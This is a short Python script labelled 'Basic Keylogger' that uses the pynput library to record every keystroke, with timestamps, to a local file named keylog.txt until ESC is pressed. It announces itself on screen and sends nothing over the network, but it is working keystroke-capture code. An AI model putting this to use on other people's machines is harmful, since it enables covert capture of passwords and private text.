from pynput import keyboard
import logging
import os
from datetime import datetime

# Setup log file
log_file = "keylog.txt"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

def main():
    print("===== Basic Keylogger =====")
    print("Logging keystrokes to 'keylog.txt'")
    print("Press ESC to stop\n")

    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()

    print(f"\nLog saved to: {os.path.abspath(log_file)}")

main()